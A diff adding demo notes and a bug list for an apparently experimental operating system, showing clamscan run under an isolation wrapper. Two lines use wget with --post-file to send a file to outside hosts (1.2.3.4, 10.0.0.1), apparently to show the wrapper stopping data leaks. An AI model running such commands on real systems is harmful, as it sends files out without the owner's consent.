@@ -1,0 +1,69 @@
+** before doing the demo, set TERM=xterm in the cygwin terminal window **
+
+on nickolai's laptop:
+    dhcpd -d eth1/eth0
+
+bootstrap:
+    scp ~/histar-bin/* root@10.0.0.2:/bin/
+    ...
+    rm /bin/ssh.tar
+
+ssh root@10.0.0.2
+
+reboot
+
+jshell:
+    cd /self
+    @ls
+    @jls
+    @asprint
+
+clamscan/clamwrap
+    /bin/clamscan -d /bin/clamav_main.cvd /bin
+    wrap /bin/clamscan -d /bin/clamav_main.cvd /bin
+
+    /bin/cp /bin/infected.file /stash
+    wrap /bin/cp /bin/infected.file /stash2
+    wrap /bin/cp /bin/infected.file /tmp
+
+    /bin/wget http://1.2.3.4/ --post-file=/bin/infected.file -O /dev/null
+    wrap /bin/wget http://1.2.3.4/ --post-file=/bin/infected.file -O /dev/null
+
+authd: adduser, login, ...
+    show /uauth, structure of user auth daemon?
+    show /uauth/username/auth_user/config/respect-root
+
+gcc
+    tar -xf /bin/gcc.tar.gz
+    echo 'int main() { printf("Hello world.\\n"); }' > hello.c
+    [ or use vim, but it's sluggish ]
+    gcc hello.c -o hello
+    ./hello
+
+BUGS
+
+(1) after a number of ssh connections, the ssh server stops working:
+
+    Received disconnect from 10.0.0.2: 2: fork failed: Cannot allocate memory
+
+    the console says:
+
+    user panic at lib/netd_gatesrv.cc:56: netd_gate_entry: cannot copy back: invalid parameter
+
+    and then for every new connection:
+
+    fork: pkg/uclibc/libc/sysdeps/jos64/fork.cc:74: top_ct: label check failure
+    netd_slow_call: gate_call: creating tainted container: label check failure
+
+(2) wget http://10.0.0.1/ --post-file=/bin/infected.file
+    seems to kill the ssh session:
+	Disconnecting: Bad packet length 1589798565.
+    but not if i use another IP in the wget URL that isn't the ssh client..
+
+(3) clamwrap gives some error about not being able to mkdir something
+    in /tmp when scanning a tar file like /bin/ssh.tar.
+
+(4) vim doesn't seem to work over ssh -- would be cool to show.
+    maybe this is related to using -T, in which case the bug is
+    that ssh without -T doesn't seem to work.
+    
